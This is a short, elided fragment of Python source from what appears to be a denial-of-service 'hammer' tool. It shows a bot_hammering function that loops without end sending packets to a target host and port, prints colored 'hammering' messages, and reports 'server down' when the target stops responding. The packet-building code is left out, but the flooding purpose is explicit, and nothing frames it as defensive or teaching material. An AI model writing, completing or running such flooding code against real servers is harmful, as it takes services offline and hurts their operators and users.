...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mBot FCM is Hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m<===| packet FCM sent! hammering |===>\033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m no connection! server down\033[0m")
